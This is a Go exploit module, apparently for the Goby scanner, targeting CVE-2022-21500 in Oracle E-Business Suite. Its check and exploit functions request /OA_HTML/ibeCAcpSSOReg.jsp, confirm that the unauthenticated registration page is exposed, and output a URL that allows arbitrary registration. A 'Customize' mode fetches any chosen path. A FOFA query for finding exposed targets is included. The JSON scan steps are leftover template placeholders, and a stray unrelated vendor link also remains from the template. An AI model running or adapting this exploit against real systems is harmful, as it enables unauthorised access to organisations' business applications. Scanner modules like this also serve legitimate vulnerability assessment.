package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "OracleE-Business ibeCAcpSSOReg.jsp Unauthorized Access Vulnerability(CVE-2022-21500)",
    "Description": "<p>Oracle E-Business Suite is a comprehensive set of integrated business applications that enable organizations to manage their financials, procurement, projects, and supply chain operations more effectively. Designed with the flexibility to adapt to the unique needs of various industries, this suite offers a broad range of functionalities including financial management, project management, customer relationship management (CRM), and human capital management (HCM). It supports global business requirements through multi-language and multi-currency capabilities, while also providing robust security features to protect sensitive data. Oracle E-Business Suite streamlines business processes, improves operational efficiency, and facilitates better decision-making through advanced analytics and reporting tools. By leveraging this powerful solution, businesses can achieve greater agility, scalability, and compliance in an increasingly complex market environment.</p>",
    "Product": "Oracle-E-Business-Suite",
    "Homepage": "https://www.oracle.com/",
    "DisclosureDate": "2024-08-21",
    "PostTime": "2024-09-24",
    "Author": "harsonyoung@qq.com",
    "FofaQuery": "header=\"X-ORACLE-DMS-ECID\" && title=\"login\"",
    "GobyQuery": "header=\"X-ORACLE-DMS-ECID\" && title=\"login\"",
    "Level": "1",
    "Impact": "<p>Its  has an information disclosure vulnerability that could allow unauthorized attackers to access sensitive information.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version: <a href=\"https://oracle.com\">https://oracle.com</a><a href=\"https://www.dahuatech.com/\"></a></p><p>2. Deploy a web application firewall . </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "ibeCAcpSSOReg.jsp",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "2H1W",
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        "CVE-2022-21500"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "OracleE-Business ibeCAcpSSOReg.jsp 未授权访问漏洞（CVE-2022-21500）",
            "Product": "Oracle-E-Business-Suite",
            "Description": "<p>Oracle E-Business Suite 是一套全面集成的商业应用软件，使组织能够更有效地管理其财务、采购、项目和供应链运营。该套件设计灵活，能够适应不同行业的独特需求，提供包括财务管理、项目管理、客户关系管理（CRM）和人力资本管理（HCM）在内的广泛功能。它通过多语言和多货币能力支持全球业务需求，同时提供强大的安全特性以保护敏感数据。Oracle E-Business Suite 通过简化业务流程、提高运营效率以及通过高级分析和报告工具促进更好的决策制定。借助这一强大解决方案，企业可以在日益复杂的市场环境中实现更大的灵活性、可扩展性和合规性。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://oracle.com\">https://oracle.com</a><a href=\"https://www.dahuatech.com/\"></a></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>系统存在未授权访问漏洞，未经授权的攻击者访问，可能会获得敏感信息。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "两高一弱",
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "OracleE-Business ibeCAcpSSOReg.jsp Unauthorized Access Vulnerability(CVE-2022-21500)",
            "Product": "Oracle-E-Business-Suite",
            "Description": "<p>Oracle E-Business Suite is a comprehensive set of integrated business applications that enable organizations to manage their financials, procurement, projects, and supply chain operations more effectively. Designed with the flexibility to adapt to the unique needs of various industries, this suite offers a broad range of functionalities including financial management, project management, customer relationship management (CRM), and human capital management (HCM). It supports global business requirements through multi-language and multi-currency capabilities, while also providing robust security features to protect sensitive data. Oracle E-Business Suite streamlines business processes, improves operational efficiency, and facilitates better decision-making through advanced analytics and reporting tools. By leveraging this powerful solution, businesses can achieve greater agility, scalability, and compliance in an increasingly complex market environment.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version: <a href=\"https://oracle.com\">https://oracle.com</a><a href=\"https://www.dahuatech.com/\"></a></p><p>2. Deploy a web application firewall .&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Its&nbsp; has an information disclosure vulnerability that could allow unauthorized attackers to access sensitive information.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "2H1W",
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9956"
}`

	postOrGet_Fq8R7R5CQj := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		defineHeader := map[string]string{}
		urlget := "/OA_HTML/" + fileUrl

		resp, err := setGetRequest(hostInfo, urlget, defineHeader)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}
		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/OA_HTML/ibeCAcpSSOReg.jsp"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"ibeCAcpSSOReg.jsp": `Register as individual</a>`,
			}
			// 函数继承
			uploadFileFunc := postOrGet_Fq8R7R5CQj

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"ibeCAcpSSOReg.jsp": {"ibeCAcpSSOReg.jsp", `Register as individual</a>`},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_Fq8R7R5CQj

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					expResult.Output = "请尝试访问另一个页面"
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				expResult.Output = "请尝试访问另一个页面"
				return expResult
			}

			expResult.Success = true
			expResult.Output = "浏览器打开以下地址可任意注册: " + expResult.HostInfo.FixedHostInfo + "/OA_HTML/" + fileUrl
			return expResult
		},
	))
}
